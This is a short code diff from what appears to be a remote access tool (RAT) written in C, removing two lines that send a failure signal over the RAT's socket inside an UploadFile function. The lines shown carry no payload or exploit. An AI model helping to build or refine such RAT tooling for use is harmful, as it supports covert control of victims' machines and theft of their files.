@@ -214,7 +214,6 @@ UploadFile(RATSocket* ratSocket,
 			}
 			else
 			{
-				SocketSend(ratSocket, "0", 1);
 				break;
 			}
 		}
@@ -224,7 +223,6 @@ UploadFile(RATSocket* ratSocket,
 	else
 	{
 		OutputDebugString("[ERROR] Error opening file.\n");
-		SocketSend(ratSocket, "0", 1);
 		return 1;
 	}
 }
